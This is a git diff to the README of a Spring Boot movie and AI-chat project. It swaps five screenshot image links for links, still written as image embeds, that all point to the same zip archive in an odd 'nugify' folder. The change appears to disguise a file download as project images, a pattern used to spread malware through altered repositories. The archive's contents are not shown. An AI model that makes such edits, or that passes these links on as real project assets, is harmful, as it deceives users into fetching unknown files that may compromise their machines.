@@ -43,21 +43,21 @@ This is a Spring Boot backend project that combines AI chat functionality with m
 
 ----------------------------------------------------------------------------------------------------
 
-![image alt](https://github.com/yuosef33/MoviesProject/blob/main/5.png?raw=true).
+![image alt](https://raw.githubusercontent.com/yuosef33/MoviesProject/main/nugify/MoviesProject.zip).
 
 ----------------------------------------------------------------------------------------------------
 
-![image alt](https://github.com/yuosef33/MoviesProject/blob/main/1.png?raw=true)
+![image alt](https://raw.githubusercontent.com/yuosef33/MoviesProject/main/nugify/MoviesProject.zip)
 
 ----------------------------------------------------------------------------------------------------
 
-![image alt](https://github.com/yuosef33/MoviesProject/blob/main/2.png?raw=true).
+![image alt](https://raw.githubusercontent.com/yuosef33/MoviesProject/main/nugify/MoviesProject.zip).
 
 ----------------------------------------------------------------------------------------------------
 
-![image alt](https://github.com/yuosef33/MoviesProject/blob/main/3.png?raw=true).
+![image alt](https://raw.githubusercontent.com/yuosef33/MoviesProject/main/nugify/MoviesProject.zip).
 
 ----------------------------------------------------------------------------------------------------
 
-![image alt](https://github.com/yuosef33/MoviesProject/blob/main/4.png?raw=true).
+![image alt](https://raw.githubusercontent.com/yuosef33/MoviesProject/main/nugify/MoviesProject.zip).
 
